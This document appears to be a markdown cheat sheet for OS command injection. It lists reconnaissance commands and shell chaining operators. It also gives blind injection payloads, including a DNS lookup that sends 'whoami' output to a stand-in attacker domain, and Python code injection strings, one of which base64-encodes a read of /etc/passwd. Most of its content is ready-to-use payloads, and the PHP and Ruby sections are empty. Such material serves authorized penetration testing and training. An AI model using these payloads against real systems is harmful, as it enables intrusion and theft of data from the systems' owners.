# Command Injection
## Useful Linux Commands

| Info | Command | 
|:-----|:--------|
| Name of current user | `whoami` |
| Operating system | `uname -a` |
| Network configuration | `ifconfig` |
| Network connections |	`netstat -an` |
| Running processes | `ps -ef` |

## Useful Windows Commands

| Info | Command | 
|:-----|:--------|
| Name of current user | `whoami` |
| Operating system | `ver` |
| Network configuration | `ipconfig /all` |
| Network connections |	`netstat -an` |
| Running processes | `tasklist` |

## Blind OS Command Injection
| Info | Command | 
|:-----|:--------|
| Use ping to generate a long delay | `& ping -c 10 127.0.0.1 &` |
| Write to web directory | `& whoami > /var/www/static/whoami.txt &` |
| Use DNS (Burp Collaborator Client) | `& nslookup kgji2ohoyw.web-attacker.com &` |
| Use DNS (Burp Collaborator Client) | ``& nslookup `whoami`.kgji2ohoyw.web-attacker.com &`` |


## OS commands
### Linux and Windows
| Info | Command | 
|:-----|:--------|
| Executes the command asynchronously in a subshell | `&` |
| Execute command2 only if, command1 succeeds | `&&` |
| Pipe output of command1 into command 2 | `\|` |
| Execute command2 only if, command3 fails | `\|\|` |

### Linux Only
| Info | Command | 
|:-----|:--------|
| Commands are executed sequentially | `;` |
| Newline | `0x0a or \n` |

### Inline execution
| Info | Command | 
|:-----|:--------|
| Backticks | `` `injected command` `` |
| $ & Brackets | `$(injected command)` |

## Perl
| Info | Command | 
|:-----|:--------|
| Basic example (Chrome only) | ``hacker'.`id`.'`` |


## PHP
## Python
| Info | Command | 
|:-----|:--------|
| A single double quote to generate error | `"` |
| A plus and another double quote to remove error | `"%2b"` |
| Confirm it is actually python | `"%2bstr(True)%2b"test` |
| Return system ID | `"%2bos.popen('id').read()%2b"` |
| Blind command | `"%2bos.system('id')%2b"` |
| If system module is not loaded | `"%2bstr(__import__('os').system('id'))%2b"` |
| Base64 encode cat etc passwd | `"%2bstr(__import__('os').popen(__import__('base64').b64decode('Y2F0IC9ldGMvcGFzc3dkCg==')).read())%2b"` |


## Ruby
